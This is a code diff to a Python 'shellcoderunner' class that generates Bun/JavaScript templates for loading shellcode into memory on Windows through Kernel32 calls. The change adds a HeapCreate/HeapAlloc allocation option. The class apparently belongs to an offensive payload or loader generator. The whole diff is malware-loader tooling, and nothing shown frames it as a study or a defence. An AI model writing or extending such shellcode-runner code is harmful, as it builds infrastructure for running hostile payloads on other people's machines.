@@ -10,7 +10,7 @@ class shellcoderunner:
 
         self.allocation = 'VirtualAlloc'
         if 'allocation' in arguments:
-            if arguments['allocation'] in ['VirtualAlloc', 'NtAllocateVirtualMemory', 'VirtualAllocEx']:
+            if arguments['allocation'] in ['VirtualAlloc', 'NtAllocateVirtualMemory', 'VirtualAllocEx', 'HeapAlloc']:
                 self.allocation = arguments['allocation']
             else:
                 print('Allocation argument must be VirtualAlloc, VirtualAllocEx, HeapAlloc, or NtAllocateVirtualMemory')
@@ -51,7 +51,7 @@ class shellcoderunner:
     def imports(self) -> list[str]:
         return ['import Kernel32 from "@bun-win32/kernel32";', 
                 'import { toArrayBuffer, ptr } from "bun:ffi";',
-                'import { MemoryAllocationType, MemoryProtection, ThreadAccessRights } from "@bun-win32/kernel32";']
+                'import { MemoryAllocationType, MemoryProtection, ThreadAccessRights, HeapAllocFlags } from "@bun-win32/kernel32";']
 
     def compilerOptions(self) -> list[str]:
         return []
@@ -80,6 +80,12 @@ class shellcoderunner:
             template += """
     let address = {VirtualAllocEx}(-1n, 0, {shellcodeSize}n, MemoryAllocationType.MEM_COMMIT | MemoryAllocationType.MEM_RESERVE, MemoryProtection.PAGE_READWRITE);
 """
+        elif self.allocation == 'HeapAlloc':
+            template += """
+    let hHeap = {HeapCreate}(0, {shellcodeSize}, 0);
+    let address = {HeapAlloc}(hHeap, HeapAllocFlags.HEAP_ZERO_MEMORY, {shellcodeSize});  
+"""
+
         if self.copy == 'memcpy':
             template += """
     let buffer = new Uint8Array(toArrayBuffer(Number(address), 0, {shellcodeSize}));
